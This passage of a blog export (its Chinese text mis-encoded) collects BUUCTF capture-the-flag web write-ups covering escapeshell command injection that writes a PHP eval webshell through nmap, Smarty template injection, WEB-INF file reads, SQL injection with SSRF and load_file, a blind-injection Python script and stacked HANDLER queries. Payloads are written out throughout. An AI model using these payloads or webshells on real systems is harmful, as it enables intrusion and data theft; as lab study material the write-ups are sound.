¹ç›®å½•ï¼‰çš„åŸºæœ¬è·¯å¾„ã€‚\n$_SERVER[â€˜SCRIPT_NAMEâ€™] #åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„ã€‚è¿™åœ¨é¡µé¢éœ€è¦æŒ‡å‘è‡ªå·±æ—¶éå¸¸æœ‰ç”¨ã€‚\n$_SERVER[â€˜PHP_AUTH_USERâ€™] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åã€‚\n$_SERVER[â€˜PHP_AUTH_PWâ€™] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯ç”¨æˆ·è¾“å…¥çš„å¯†ç ã€‚\n$_SERVER[â€˜AUTH_TYPEâ€™] #å½“ PHP è¿è¡Œåœ¨ Apache æ¨¡å—æ–¹å¼ä¸‹ï¼Œå¹¶ä¸”æ­£åœ¨ä½¿ç”¨ HTTP è®¤è¯åŠŸèƒ½ï¼Œè¿™ä¸ªå˜é‡ä¾¿æ˜¯è®¤è¯çš„ç±»å‹\n\nç¬¬ä¸€éƒ¨åˆ†\n\nX-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ\n\n```php\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n```\n\nè·å–æœ¬æœºçš„ip\n\nç¬¬äºŒéƒ¨åˆ†ï¼š\n\næœ‰ä¸¤ä¸ªå¾ˆé‡è¦çš„å‡½æ•°\n\n**escapeshellargä¼šé¦–å…ˆåœ¨å•å¼•å·å‰åŠ åæ–œçº¿ï¼Œç„¶åå°†å•å¼•å·åˆ†å‰²çš„å‡ éƒ¨åˆ†ï¼Œéƒ½ç”¨å•å¼•å·æ‹¬èµ·æ¥****\n****escapeshellcmdä¼šå°†&#;`|\\*?~<>^()[]{}$\\, \\x0A å’Œ \\xFFä»¥åŠä¸é…å¯¹çš„å•/åŒå¼•å·è½¬ä¹‰**\n\nä¸¾ä¸ªä¾‹å­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341140.png)\n\næ³¨æ„è¿™é‡Œç¯å¢ƒä¸€å®šè¦åœ¨linuxæ‰è¡Œ å¦‚æœç¯å¢ƒåœ¨windowä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼Œç›®å‰è¿˜æ²¡å¼„æ‡‚æ˜¯å•¥åŸå› \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341179.png)\n\nè¿™æ ·å½“è¿™ä¸¤ä¸ªå‡½æ•°æ··åˆåœ¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå°±ä¼šå¯¼è‡´ï¼Œè½¬ä¹‰çš„å•å¼•è¢«ç»•è¿‡ã€‚\n\næœ‰äº†è‘—åçš„æ¼æ´ é™„ä¸Šå¤§ä½¬çš„é“¾æ¥å­¦ä¹  https://paper.seebug.org/164/\n\né¢˜ç›®ä¸­ç»™å‡ºçš„æ˜¯nmapå‘½ä»¤ï¼Œæ‹¼æ¥ä¸Šæˆ‘ä»¬å¯æ§çš„å‚æ•°$hostï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ·»åŠ nmapå‚æ•°æ‰§è¡Œå°†å‘½ä»¤å’Œç»“æœå†™å…¥æ–‡ä»¶çš„æ“ä½œï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ç›®å‰è¿˜æ²¡æœ‰å­¦ä¹ åˆ°nmapï¼Œæš‚æ—¶å…ˆä¸è§£é‡Šã€‚\n\nnmapå†™å…¥æ–‡ä»¶çš„å‚æ•°æ˜¯ -oG\n\n\n\nmkdir ()â€” æ–°å»ºç›®å½•\n\nchdir ()â€” æ”¹å˜ç›®å½•\n\næ„é€ peyload\n\n```\n?host='<?php @eval($_POST[x]); ?> -oG 1.php '` æ³¨æ„æ­¤å¤„æœ‰ç©ºæ ¼ å½“æ—¶ä¸€ç›´æ²¡åšå‡ºæ¥ è¦æœ‰ç©ºæ ¼ ä¸ç„¶nmapæ‰§è¡Œåé¢çš„æ–‡ä»¶å°±ä¼šå˜æˆ `1.php//\n```\n\nç»è¿‡ä¸¤æ¬¡å‡½æ•°ä¹‹å\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341131.png)\n\n```\n''\\\\''\\<\\?php @eval\\(\\$_POST\\[\"hack\"\\]\\)\\;\\?\\>  -oG 1.php '\\\\'''\n```\n\nå›¾ç‰‡ä¸çŸ¥é“ä¸ºå•¥æŠŠæˆ‘evalä¸­çš„å†…å®¹åäº†ä¸çŸ¥é“ä¸ºå•¥\n\nç›¸å½“äº\n\n```\n\\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\n```\n\nç›¸å½“äºæ‰§è¡Œäº† \n\n```\nsystem(\"nmap -T5 -sT -Pn --host-timeout 2 -F \\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341212.png)\n\näº§ç”Ÿçš„æ–‡ä»¶å¤¹å è¢«md5åŠ å¯†äº†\n\nä¹‹åè®¿é—®çš„æ—¶å€™åŠ ä¸Šå°±è¡Œ\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341036.png)\n\næ„Ÿæ‚Ÿ: nmapè¿˜ä¸€ç‚¹éƒ½æ²¡æœ‰å­¦ä¹ ï¼Œåšè¿™ä¸ªé¢˜è´¹äº†å¥½å¤§åŠ²ï¼Œä¹‹åæœ‰ç©ºè¦å»æ¶‰ç•¥ä¸€ä¸‹nmapã€‚\n","tags":["nmap","$_SERVER","esc***å‡½æ•°"],"categories":["buuctf"]},{"title":"buuctf 35-[BJDCTF2020]The mystery of ip","url":"/post/a4341e77.html","content":"\nbuuctf [BJDCTF2020]The mystery of ip\n\n<!--more-->\n\nè¿™é“é¢˜è€ƒåˆ°äº†æ¨¡æ¿æ³¨å…¥ç®€å•è®°å½•ä¸€äº›å§  å‚è€ƒï¼šhttps://houbb.github.io/2020/08/09/web-safe-12-ssti\n\næœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜.  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342348.png)\n\nè·å–åˆ°äº†æˆ‘ä»¬çš„ipï¼Œç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°äº†ä¿®æ”¹xff\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342770.png)\n\nä½†æ˜¯æ²¡å•¥ç”¨ æ€è·¯å¤§æ¦‚æ˜¯å°±æ˜¯åˆ©ç”¨xff è¿›è¡Œæ¶æ„è¯»å–å§ çœ‹äº†wp æ˜¯phpçš„smartyæ¨¡æ¿æ³¨å…¥ å‚è€ƒï¼šhttps://www.anquanke.com/post/id/272393\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342128.png)\n\nä»£ç ç›´æ¥è¿è¡Œäº† äºæ˜¯ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œå°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342033.png)\n\nç›´æ¥è¯»æ ¹ç›®å½•flagæ–‡ä»¶å°±è¡Œäº†\n","tags":["æ¨¡æ¿æ³¨å…¥","xff","smartyæ¨¡æ¿"],"categories":["buuctf"]},{"title":"buuctf 34-[RoarCTF 2019]Easy Java","url":"/post/d05894c4.html","content":"\nbuuctf 34-[RoarCTF 2019]Easy Java\n\n<!--more-->\n\nå¼±å£ä»¤èƒ½çˆ†å‡ºæ¥ï¼š\n\nè´¦å·:admin\n\nå¯†ç : admin888\n\nä½†æ˜¯æ²¡å•¥ç”¨ è¿˜æ˜¯æ‰€ä»¥åªå‰©ä¸‹ç™»å½•é¡µé¢çš„å¸®åŠ©äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343030.png)\n\nè¿™é‡Œè€ƒåˆ°äº†java çš„ WEB-INF çŸ¥è¯†ç‚¹ å‚è€ƒï¼šhttps://www.cnblogs.com/shamo89/p/9948707.html\n\nä½†æ˜¯è¿™é‡Œé€šè¿‡getæ–¹å¼ä¼ å‚æ˜¯ä¸è¡Œçš„ åªèƒ½é€šè¿‡post\n\næ„é€  payloadï¼š `filename=WEB-INF/web.xml`\n\nWEB-INF/web.xml  ï¼š Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™   å¯ä»¥æ‰¾åˆ°flagçš„ä½ç½®ä»¥åŠå‘½åæ–¹å¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343221.png)\n\næ‰¾åˆ°äº†flagçš„åœ°å€ ä»¥åŠä»–çš„å‘½åæ–‡ä»¶\n\nç§‰æŒjava ä¸‡ç‰©éƒ½æ˜¯ç±»çš„åŸåˆ™ è¦è¯»å–flag å°±è¦è¯»è¿™ä¸ªflagç±»\n\nWEB-INF/classes/\n\n åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰  \n\næ„é€ payload ï¼š`filename=WEB-INF/classes/com/wm/ctf/FlagController.class`ä¸è¦å¿˜äº†classåç¼€ ä¸€å¼€å§‹å°±å¿˜äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343109.png)\n\nè§£ç  å¾—åˆ°flagï¼\n","tags":["å¼±å£ä»¤","java"],"categories":["buuctf"]},{"title":"buuctf 33-[ç½‘é¼æ¯ 2018]Fakebook","url":"/post/c6fe9d66.html","content":"\nbuuctf [ç½‘é¼æ¯ 2018]Fakebook\n\n<!--more-->\n\næ—¥å¸¸è®¿é—®robots.txtæ–‡ä»¶\n\n robots.txt æ–‡ä»¶è§„å®šäº†æœç´¢å¼•æ“æŠ“å–å·¥å…·å¯ä»¥è®¿é—®æ‚¨ç½‘ç«™ä¸Šçš„å“ªäº›ç½‘å€ã€‚  \n\nå‘ç°æœ‰ä¸ªæ–‡ä»¶å¯ä»¥æ‰“å¼€\n\né™„ä¸Šæºç ï¼š\n\n```plain\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\n\næ˜¯ä¸€ä¸ªphpå†™çš„ç±» ç„¶åç”¨äº†curl\n\ncurl:https://blog.csdn.net/yangyu112654374/article/details/4658854\n\nç„¶åå‘ç°æœ‰ `$output = curl_exec($ch)` å¯ä»¥å°†ç±»ä¸­`blog`é‡æ–°æ„é€ ç”¨æ¥æ‰§è¡Œssrfæ¼æ´\n\nhttps://xz.aliyun.com/t/11215 ç›´æ¥çœ‹å¤§ä½¬çš„æ€»ç»“\n\nç”³è¯·ä¸€ä¸ªè´¦å·è¿›å…¥å¯ä»¥çœ‹åˆ°å­˜åœ¨sqlæ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344592.png) \n\nåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹æ³¨å…¥\n\n`no=1 and 1=1#` å¯ä»¥\n\n`no=1 and 1=2#` ä¸è¡Œ\n\nè¯´æ˜è¿™æ˜¯æ•°å­—æ³¨å…¥\n\n`?no=0 order by 4#`  å››åˆ—\n\næŠ¥é”™æ³¨å…¥(è¿™é‡Œæ¯”è¾ƒæ¨èæŠ¥é”™ è”åˆæŸ¥è¯¢çš„è¯ä¸€å¼€å§‹æ‰¾ä¸åˆ°å›æ˜¾ç‚¹ å¯èƒ½æ˜¯æˆ‘çœ¼ç)\n\nå…¶å®æ˜¯è¿‡æ»¤äº† `union select` ç”¨`union/**/select` ç»•è¿‡å°±è¡Œ\n\n`1 and updatexml(1,concat('~',database(),'~'),3)#` æ³¨æ„~ ä¸èƒ½ç”¨åå…­è¿›åˆ¶çš„ 0x7e è¿™é‡Œæœ‰æ£€æµ‹ ç”¨å›åŸå‹å¥½å°±è¡Œ\n\n[*] query error! (XPATH syntax error: '~fakebook~')\n\n```\n1 and updatexml(1,concat('~',select user(),'~'),3)# \n```\n\nè”åˆæ³¨å…¥\n\n```\n?no=-1 union/**/select 1,database(),3,4#\n```\n\nfakebook\n\n```\n?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#\n```\n\nusers\n\n```\n?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#\n```\n\nno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n\n `?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users#`\n\n 1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:11:\"www.123.com\";}\n\n åˆ©ç”¨ssrfæ¼æ´ è¯»å–å†…å®¹\n\næ„é€ ç±»é‡Œçš„ blogå±æ€§å€¼ä¸º `s:29:\"file:///var/www/html/flag.php\"`\n\n æ„é€ payload: `?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'`\n\nå¾—åˆ°base64ç \n\n```\nPD9waHANCg0KJGZsYWcgPSAiZmxhZ3s1MTkzODdkNS02OWQ2LTQ0OGEtYWQyZS0wODgxYmJkOThiNDl9IjsNCmV4aXQoMCk7DQo=\n```\n\n<?php\n\n\n\n$flag = \"flag{519387d5-69d6-448a-ad2e-0881bbd98b49}\";\n\nexit(0);\n\n\n\næ³•äºŒï¼š\n\n```\n?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4#\n```\n\nä¹‹å‰çœ‹åˆ°ç”¨æˆ·æ˜¯ç®¡ç†å‘˜ æ‰€ä»¥è”æƒ³åˆ°ç”¨load_fileå‡½æ•°\n\nå»è¿™é‡Œçœ‹https://www.cnblogs.com/junlebao/p/14104036.html\n","tags":["sqlæ³¨å…¥","robots.txt","ååºåˆ—åŒ–","curl","ssrf"],"categories":["buuctf"]},{"title":"buuctf 32-[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World","url":"/post/3b320c12.html","content":"\nbuuctf CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World\n\n<!--more-->\n\nè¿™é“é¢˜æ˜¯ä¸€é“æ¯”è¾ƒç»å…¸çš„å¸ƒå°”ç›²æ³¨çš„é¢˜ç›®ï¼Œä¹Ÿå°±å…¨å½“ä½œæ˜¯å­¦ä¹ äº†ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344880.png)\n\né¢˜ç›®è¡¨ç¤ºflagåœ¨flagè¡¨é‡Œçš„flagå­—æ®µé‡Œ è¿™ç‚¹å°±å¾ˆå¯ç–‘\n\nè¾“å…¥ 1ï¼Œ2éƒ½æœ‰æ­£ç¡®çš„å›æ˜¾\n\nè¾“å…¥`1'`æ—¶æ˜¾ç¤º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344854.png)\n\næ˜¾ç¤ºå¸ƒå°”ï¼ˆé”™è¯¯ï¼‰ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ¤æ–­æ˜¯å¸ƒå°”æ³¨å…¥äº†\n\nå¥½å¥½å­¦ä¹ ä¸€ä¸‹å¸ƒå°”ç›²æ³¨çš„çŸ¥è¯†ï¼š\n\nè¿™é‡Œæœ‰ç¯‡å¸ƒå°”ç›²æ³¨çš„çš„æ–‡ç« ï¼šhttps://blog.csdn.net/wangyuxiang946/article/details/123486880 å¯ä»¥å­¦ä¹ å­¦ä¹ \n\nsubstr(string,å¼€å§‹1ï¼Œé•¿åº¦)å‡½æ•° ç”¨äºæˆªå–å­—ç¬¦ä¸²çš„éƒ¨åˆ†å­—ç¬¦ä¸²\n\nasscii() ç”¨äºå°†å­—ç¬¦è½¬åŒ–æˆasciiç¼–ç \n\nè¿™é‡Œæœ¬åœ°æ­äº†ä¸€ä¸ªç¯èŠ‚æµ‹è¯•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344816.png)\n\nåœ¨é¢˜ç›®æµ‹è¯•ä¸€ä¸‹\n\n```\nselect ascii(substr((select flag from flag),1,1))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344111.png)\n\nå‘ç°è¢«è¿‡æ»¤äº† fuzzä¸€ä¸‹å“ªäº›è¢«è¿‡æ»¤äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344901.png)\n\nå‘ç°ä¸€äº›å¸¸ç”¨çš„ ç©ºæ ¼ `or union` éƒ½è¢«è¿‡æ»¤äº† `/**/`ç»•è¿‡ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº† æ‰€ä»¥åªèƒ½ç”¨`()`æ¥ç»•è¿‡\n\næ„é€ payloadï¼š\n\n```\nselect(ascii(substr((select(flag)from(flag),1,1)))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344886.png)\n\næ­£å¸¸å›æ˜¾äº†\n\nè¿™é‡Œå†ç”¨åˆ°mysql çš„ifè¯­å¥\n\nif(æ¡ä»¶ï¼ŒæˆåŠŸå›æ˜¾ï¼Œå¤±è´¥å›æ˜¾)\n\næœ¬åœ°æµ‹è¯•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344175.png)\n\nè¿™æ˜¯ä¸ºä»€ä¹ˆæ¡ä»¶ç­‰äº84 æ˜¯å› ä¸º æˆ‘æœ¬åœ°flagçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºT asciiç¼–ç ä¸º84\n\næ„é€ payloadï¼š`if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344201.png)\n\næˆåŠŸå›æ˜¾ è‡³äºä¸ºä»€ä¹ˆæ˜¯102 å› ä¸ºflagå¼€å¤´f çš„asciiç¼–ç ä¸º102\n\né‚£ä¹ˆå°±å¯ä»¥å€ŸåŠ©è„šæœ¬ï¼Œè¿™é‡Œå› ä¸ºæˆ‘pythonæ²¡æ€ä¹ˆå­¦ï¼Œè„šæœ¬ä¸ä¼šå†™\n\nä½†æ˜¯æ•´ä½“è„šæœ¬æ€è·¯ä¸º å½“åŒ¹é…å­—ç¬¦ascii ä¸é¢˜ç›®ç›¸åŒæ—¶å›æ˜¾1 å¦åˆ™å›æ˜¾0 è„šæœ¬æ ¹æ®é¢˜ç›®å›æ˜¾çš„è¯­å¥è¿›è¡Œåˆ¤æ–­\n\nç„¶åéå†æ•´ä¸ª32-126 asciiç¼–ç å­—ç¬¦\n\nè¿™é‡Œæ”¾ä¸€ä¸‹å¤§ä½¬çš„è„šæœ¬ï¼š\n\n```python\nimport requests\nimport time\nimport re\nurl='http://4fdaca11-2d67-4dbe-b046-a42e64af5917.node4.buuoj.cn:81/index.php'\nflag = ''\nfor i in range(1,43):\n    max= 127\n    min = 0\n    for c in range(0,127):\n        s = (int)((max+min)/2)\n        payload = '0^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'\n        r = requests.post(url,data = {'id':payload})\n        time.sleep(0.005)\n        if 'Hello, glzjin wants a girlfriend.' in str(r.content):\n            min=s\n        else:\n            max=s\n        if((max-min)<=1):\n            flag+=chr(max)\n            print(flag)\n            break\n```\n\nä»¥åæœ‰æ—¶é—´è¦æ»šå»å­¦ä¹ å†™å†™è„šæœ¬äº†qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344220.png)\n","tags":["sqlæ³¨å…¥","è„šæœ¬"],"categories":["buuctf"]},{"title":"buuctf 31-[GYCTF2020]Blacklist","url":"/post/a8bde72c.html","content":"\nbuuctf [GYCTF2020]Blacklist\n\n<!--more-->\n\nè¿™é“é¢˜åˆæ˜¯ä¸€é“å­¦ä¹ çš„é¢˜ç›®ï¼Œæ‰“å¼€çœ‹åˆ°ç•Œé¢uiå¾ˆåƒä¸€é“å †å æ³¨å…¥çš„é¢˜ç›®ï¼Œåˆšå¥½è¿™é“é¢˜ä¹Ÿæ˜¯ç”¨å †å æ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345646.png)\n\næŸ¥å­—æ®µï¼š`1' order by 3#`\n\n`error 1054 : Unknown column '3' in 'order clause'` åªæœ‰ä¸¤åˆ—\n\nè¿™é“é¢˜è¿‡æ»¤äº† \n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\nä¸èƒ½ç”¨é¢„ç¼–è¯‘ select æŠ¥é”™æ³¨å…¥åº”è¯¥æ˜¯\n\n```\n1'; show databases#\n```\n\n\"supersqli\"\n\n```\n1'; show tables#\n```\n\n\"FlagHere\"\n\n```\n1';show columns from FlagHere#\n```\n\nç›´æ¥ç”¨`1';desc FlagHere#`ä¹Ÿå¯ä»¥\n\n  string(4) \"flag\"\n\ndescç”¨æ³•ï¼š\n\n1.æŸ¥è¡¨çš„è¯¦ç»†ä¿¡æ¯  egï¼š`desc table_name;`\n\n2.descé™åºæ’åˆ—æ•°æ®  eg: `select select ename,sal from emp order by sal desc; `\n\næ‰‹åŠ¨æŒ‡å®šæŒ‰ç…§è–ªæ°´ç”±å¤§åˆ°å°æ’åºï¼ˆé™åºå…³é”®å­—descï¼‰\n\nç„¶åè¿™é‡Œç”¨åˆ°äº† mysql handlerè¯­å¥æŸ¥è¯¢å­—æ®µå†…çš„ä¿¡æ¯\n\nè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®\n\nä¸‹é¢åœ¨æœ¬åœ°æ­äº†ä¸€ä¸ªç¯å¢ƒè¿›è¡Œæµ‹è¯• å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345725.png)\n\nä¹‹åå°±å¯ä»¥æ„é€ payloadï¼š\n\n```\n1';HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# \n```\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345650.png)\n","tags":["sqlæ³¨å…¥","å †å æ³¨å…¥","handlerç”¨æ³•"],"categories":["buuctf"]},{"title":"buuctf 29-[GXYCTF2019]BabySQli","url":"/post/b32b8b53.html","content":"\nbuuctf [GXYCTF2019]BabySQli\n\n<!--more-->\n\næŠ“åŒ…å‘ç°ä¸€ä¸²å¯†æ–‡ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346082.png)\n\n`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5` è¿™æ˜¯ä¸€ä¸²base32ç¼–ç ï¼Œbase32ç¼–ç ç‰¹å¾æ˜¯åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—\n\nè§£å¯†åï¼š`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==` è¿™æ˜¯ä¸€ä¸²base64ç¼–ç ï¼Œbase64ç¼–ç ç‰¹ç‚¹æ˜¯æœ‰å¤§å°å†™å­—æ¯å’Œæ•°å­—è€Œä¸”æœ«å°¾å¸¸å¸¸æ˜¯ç­‰äºå·\n\nè§£ç  å¾—åˆ°ï¼š`select * from user where username = '$name'`\n\næ„æ€æ˜¯è®©æˆ‘ä»¬ä»ç™»å½•åè¿›è¡Œæ³¨å…¥\n\nè¿™ä¸ªé¢˜ç›®è¿‡æ»¤äº†è›®å¤šå¸¸ç”¨æŸ¥è¯¢å­—ç¬¦ï¼Œå¯ä»¥bpæŠ“åŒ… fuzzä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345905.png)\n\næ˜¾ç¤º419å°±æ˜¯è¢«æ²³èŸ¹çš„ 415å°±æ˜¯æ­£å¸¸å›æ˜¾\n\nè¿‡æ»¤äº† å¸¸ç”¨çš„`or``ï¼ˆï¼‰` ç„¶åå¯ä»¥å¤§å†™ç»•è¿‡\n\næ„é€ `1' Order by 4#` å‘ç°æŠ¥é”™åªæœ‰ä¸‰åˆ—\n\nè¿™é‡Œå†æä¾›ä¸€ç§selectæŸ¥è¯¢çˆ†å­—æ®µçš„æ–¹æ³•\n\n`select 1,2#` æŠ¥é”™ `select 1,2,3#` æ­£å¸¸å›æ˜¾ä¹Ÿå¯ä»¥ç”¨æ¥åˆ¤æ–­å­—æ®µæ•°\n\nç„¶åå°±ä¸ä¼šäº† çœ‹äº†å…¶ä»–å¤§ä½¬çš„wp\n\nè¿™é‡Œåˆ©ç”¨äº†ä¸€ä¸ªmysqlè”åˆæŸ¥è¯¢çš„ç‰¹æ€§ï¼š\n\n**unionåšæŸ¥è¯¢æ—¶ï¼ŒæŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆè”åˆæŸ¥è¯¢å°±ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®å­˜æ”¾åœ¨æ•°æ®åº“ä¸­**\n\nå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡å¤§ä½¬çš„è¯¦ç»†wpï¼šhttps://www.tqwba.com/x_d/jishu/272679.html\n\nç”±äºåªèƒ½é€šè¿‡adminè´¦æˆ·,å› æ­¤è®©è™šæ‹Ÿç”¨æˆ·çš„åå­—æ˜¯admin åŒæ—¶å¯†ç è½¬æ¢æˆäº†md5å­˜å‚¨(çŒœæµ‹åº”è¯¥æ˜¯ä¸ºäº†ä¿æŠ¤ç”¨æˆ·çš„éšç§,md5ä¸å¯é€†,è¿™å°±è®©å³ä½¿èº«ä¸ºç®¡ç†å‘˜ä¹Ÿä¸èƒ½çŸ¥é“ç”¨æˆ·å¯†ç )äºæ˜¯åœ¨æ„é€ çš„æ—¶å€™è¦æ³¨æ„æ•°æ®åº“å¯†ç 